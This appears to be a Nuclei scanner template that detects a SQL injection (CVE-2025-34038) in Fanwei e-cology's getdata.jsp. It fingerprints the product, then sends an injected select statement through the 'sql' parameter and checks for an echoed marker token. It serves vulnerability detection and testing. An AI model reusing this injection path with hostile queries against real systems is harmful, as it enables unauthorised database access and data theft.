id: CVE-2025-34038
info:
  name: Fanwei e-cology SQL Injection in getdata.jsp
  author: Intelligent-ears
  severity: critical
  description: |
    SQL injection in Fanwei e-cology 8.0 via the getdata.jsp endpoint. The application
    passes the `sql` parameter into getSelectAllIds(sql,type) reachable with cmd=getSelectAllId.
  reference:
    - https://cvefeed.io/vuln/detail/CVE-2025-34038
    - https://www.vulncheck.com/advisories/fanwei-ecology-sql-injection
  tags: cve, cve2025, fanwei, sqli, ecology

requests:
  - method: GET
    path:
      - "{{BaseURL}}/wui/common/page/conditionselectpage.jsp"
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "e-cology"
          - "Weaver"
        case-insensitive: true
      - type: dsl
        dsl:
          - "len(body) > 100"

  - method: GET
    path:
      - "{{BaseURL}}/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20'1nuclei_probe'%20as%20id"
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "1nuclei_probe"
        case-insensitive: false
      - type: regex
        part: body
        regex:
          - "^\\s*1nuclei_probe\\s*$"
    extractors:
      - type: regex
        name: probe_token
        part: body
        regex:
          - "(1nuclei_probe)"
